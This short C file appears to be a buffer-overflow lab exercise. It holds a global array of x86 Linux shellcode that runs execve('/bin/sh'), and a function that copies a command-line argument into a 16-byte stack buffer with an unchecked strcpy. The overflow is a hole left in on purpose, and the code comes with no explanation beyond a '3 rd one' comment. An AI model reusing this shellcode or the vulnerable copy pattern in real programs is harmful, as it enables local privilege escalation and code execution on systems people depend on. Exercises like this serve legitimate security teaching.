#include<stdio.h>
#include<string.h>

char shell[] = "\xeb\x1c\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";

int foo(char * arg){
  char buf[16];
  strcpy(buf, arg);
  return 0;
}

int main(int argc , char *argv[]){
  foo(argv[1]);
  return 0;
}


//3 rd one



